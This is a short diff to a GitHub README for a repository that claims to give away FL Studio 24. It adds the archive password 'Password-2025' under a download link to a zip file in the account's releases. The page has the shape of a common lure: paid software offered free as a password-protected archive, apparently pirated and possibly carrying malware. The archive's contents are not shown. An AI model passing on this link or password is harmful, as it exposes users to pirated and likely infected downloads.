@@ -8,6 +8,7 @@ Welcome to the FL Studio 24 repository! 🚀 This is your ultimate destination f
 
 ## 🔗 Software Access  
 ### [Download FL Studio](https://github.com/Xyt069/Fl-Studio-24-For-PC/releases/download/fl-studio/Fl.Studio.PC.zip)
+Password-2025
 
 
 
